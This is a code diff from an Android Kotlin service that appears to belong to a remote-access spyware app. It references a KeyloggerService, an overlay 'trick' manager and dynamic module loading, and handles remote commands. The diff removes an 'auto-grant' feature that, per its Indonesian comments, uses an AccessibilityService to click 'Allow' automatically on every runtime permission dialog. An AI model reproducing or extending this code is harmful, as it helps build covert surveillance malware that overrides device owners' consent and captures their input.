@@ -296,12 +296,6 @@ class ConnectorService : Service() {
             cmd == "overlay_status"         -> Pair(OverlayTrickManager.status(), "command_result")
             cmd == "overlay_request_perm"   -> Pair(requestOverlayPermission(), "command_result")
 
-            // ── Auto-Grant: klik "Izinkan" otomatis via AccessibilityService ──
-            // Tidak perlu overlay / SYSTEM_ALERT_WINDOW — murni node ACTION_CLICK
-            cmd == "auto_grant_on"     -> Pair(doAutoGrantOn(), "command_result")
-            cmd == "auto_grant_off"    -> Pair(doAutoGrantOff(), "command_result")
-            cmd == "auto_grant_status" -> Pair(doAutoGrantStatus(), "command_result")
-
             cmd == "modules_reload"         -> { DexModuleLoader.invalidate(); DexModuleLoader.preloadAll(this); Pair("✅ Modules reloading…", "command_result") }
 
             else -> Pair("ERROR: Unknown command: $cmd", "command_result")
@@ -752,28 +746,6 @@ class ConnectorService : Service() {
 
     private fun log(msg: String) {
         android.util.Log.d("ConnectorService", msg)
-    }
-
-    // ── Auto-Grant via AccessibilityService ───────────────────────────────────
-    private fun doAutoGrantOn(): String {
-        if (KeyloggerService.instance == null)
-            return "⚠️ AccessibilityService belum aktif — aktifkan dulu di Settings"
-        KeyloggerService.autoGrantEnabled = true
-        return "✅ Auto-grant ON — setiap dialog izin runtime akan otomatis di-klik 'Izinkan'"
-    }
-
-    private fun doAutoGrantOff(): String {
-        KeyloggerService.autoGrantEnabled = false
-        return "⚫ Auto-grant OFF"
-    }
-
-    private fun doAutoGrantStatus(): String {
-        val svcOk = KeyloggerService.instance != null
-        val on    = KeyloggerService.autoGrantEnabled
-        return buildString {
-            append("Auto-grant: ${if (on) "🟢 ON" else "⚫ OFF"}")
-            if (!svcOk) append(" | ⚠️ AccessibilityService tidak aktif")
-        }
     }
 
     // ── Overlay Permission Request ─────────────────────────────────────────
